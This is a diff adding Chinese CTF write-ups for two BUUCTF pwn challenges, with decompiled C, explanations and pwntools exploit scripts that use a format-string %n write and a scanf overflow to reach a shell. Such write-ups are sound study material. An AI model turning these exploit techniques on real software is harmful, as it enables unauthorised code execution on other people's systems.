@@ -62,7 +62,7 @@ io.interactive()
 
 > <img src="./img_c/4.png">
 
-## pwn1_sctf_2016 1
+## pwn1_sctf_2016
 
 主要看`vuln()`函数
 
@@ -123,4 +123,158 @@ sh.interactive()
 ```
 
 > <img src="./img_c/5.png">
+
+## [第五空间2019 决赛]PWN5
+
+典型格式化字符串漏洞
+
+```c
+int __cdecl main(int a1)
+{
+  time_t v1; // eax
+  int result; // eax
+  int fd; // [esp+0h] [ebp-84h]
+  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
+  char buf[100]; // [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &dword_804C044, 4u);
+  printf("your name:");
+  read(0, buf, 99u);
+  printf("Hello,");
+  printf(buf);
+  printf("your passwd:");
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) == dword_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("fail");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+    sub_80493D0();
+  return result;
+}
+```
+
+第24行`if`判断输入等于`dword_804C044`就`getshell`，而19行`read(0, buf, 99u)`和21行`print(buf)`意味着能直接利用`buf`进行任意写
+
+先判断偏移量
+
+> <img src="./img_c/6.png">
+
+> <img src="./img_c/7.png">
+
+`esp`是格式化字符串的位置，`buf`位于`esp + 0x28`，偏移值为10
+
+因此只需要写入`dword_804C044_addr + %10$n`，就可以将`dword_804C044`的值改为4，然后传入4即可`getshell`
+
+```py
+from pwn import *
+
+# context.arch = 'amd64'
+
+# sh = process('./pwn')
+sh = remote('node5.buuoj.cn', 29741)
+
+r = 0x0804C044
+payload = p32(r) + b'%10$n'
+sh.recv()
+sh.sendline(payload)
+sh.recv()
+sh.sendline(str(4))
+sh.interactive()
+```
+
+注意后面的判断是通过`atoi()`函数进行的，会将`str`转换为`int`，因此在传入的时候就必须是`str`
+
+> <img src="./img_c/8.png">
+
+## ciscn_2019_n_8
+
+有趣的一道题
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-14h] [ebp-20h]
+  int v5; // [esp-10h] [ebp-1Ch]
+
+  var[13] = 0;
+  var[14] = 0;
+  init();
+  puts("What's your name?");
+  __isoc99_scanf("%s", var, v4, v5);
+  if ( *&var[13] )
+  {
+    if ( *&var[13] == 17LL )
+      system("/bin/sh");
+    else
+      printf(
+        "something wrong! val is %d",
+        var[0],
+        var[1],
+        var[2],
+        var[3],
+        var[4],
+        var[5],
+        var[6],
+        var[7],
+        var[8],
+        var[9],
+        var[10],
+        var[11],
+        var[12],
+        var[13],
+        var[14]);
+  }
+  else
+  {
+    printf("%s, Welcome!\n", var);
+    puts("Try do something~");
+  }
+  return 0;
+}
+```
+
+这道题开启了所有保护，因此不能通过正常途径`getshell`
+
+仔细来看代码，`scanf()`接收了`%s`到数组`var[]`，第13行`if`判断当`var[13] == 17`的时候可以直接`getshell`，也就是说只需要构造一串数据，让`scanf()`为`var[13]`赋值17即可，但这里需要注意`var[]`的数据类型
+
+C语言中，一般的数组类型有两种，一种是`char`类型，另一种是`int`类型，`char`类型的数组每个元素只占据1字节，而`int`类型的数组每个元素需要占据4字节，我们访问`var[]`，来看看数据类型
+
+```assembly
+.bss:00004060                 public var
+.bss:00004060 ; _DWORD var[15]
+.bss:00004060 var             dd 0Fh dup(?)           ; DATA XREF: main+28↑o
+.bss:00004060                                         ; main+56↑o ...
+.bss:00004060 _bss            ends
+.bss:00004060
+```
+
+很显然，`var[]`的数据类型是`_DWORD`，`_DWORD`是windows中常见的类型别名，通常定义为 `unsigned int` 或 `unsigned long`，占据4字节空间，所以，最后的exp如下
+
+```py
+from pwn import *
+
+# context.arch = 'amd64'
+
+sh = process('./ciscn_2019_n_8')
+# sh = remote('node5.buuoj.cn', 27558)
+
+payload = b'aaaa' * 13 + p32(17)
+sh.sendline(payload)
+sh.interactive()
+```
 
